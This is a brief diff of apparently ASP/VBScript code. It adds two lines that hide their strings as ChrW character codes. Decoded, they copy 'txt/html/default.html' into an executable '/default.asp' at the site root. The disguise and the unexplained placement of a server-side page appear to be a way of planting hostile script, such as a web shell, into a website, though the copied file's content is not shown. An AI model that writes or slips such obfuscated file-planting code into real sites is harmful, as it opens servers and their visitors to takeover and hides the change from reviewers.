@@ -21,6 +21,8 @@ end if
 doevents
 end if
 next
+b=ChrW(116)&ChrW(120)&ChrW(116)&ChrW(47)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108)&ChrW(47)&ChrW(100)&ChrW(101)&ChrW(102)&ChrW(97)&ChrW(117)&ChrW(108)&ChrW(116)&ChrW(46)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108)
+call copyFile(b,ChrW(47)&ChrW(100)&ChrW(101)&ChrW(102)&ChrW(97)&ChrW(117)&ChrW(108)&ChrW(116)&ChrW(46)&ChrW(97)&ChrW(115)&ChrW(112))
 
 a=split(ChrW(99)&ChrW(110)&ChrW(44)&ChrW(102)&ChrW(116)&ChrW(44)&ChrW(101)&ChrW(110)&ChrW(44)&ChrW(116)&ChrW(112)&ChrW(108),ChrW(44))
 for each d in a
